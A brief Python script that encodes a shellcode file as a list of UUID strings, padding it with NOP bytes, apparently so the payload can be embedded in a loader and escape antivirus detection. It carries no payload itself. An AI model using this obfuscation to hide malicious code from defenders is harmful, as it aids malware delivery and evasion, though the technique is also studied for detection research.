import uuid

with open("shellcode.bin", "rb") as f:
    data = f.read()

# Pad a multiplo de 16
while len(data) % 16 != 0:
    data += b"\x90"

uuids = []
for i in range(0, len(data), 16):
    chunk = data[i:i+16]
    u = uuid.UUID(bytes_le=chunk)
    uuids.append(str(u))

for u in uuids:
    print(f'\t"{u}",')
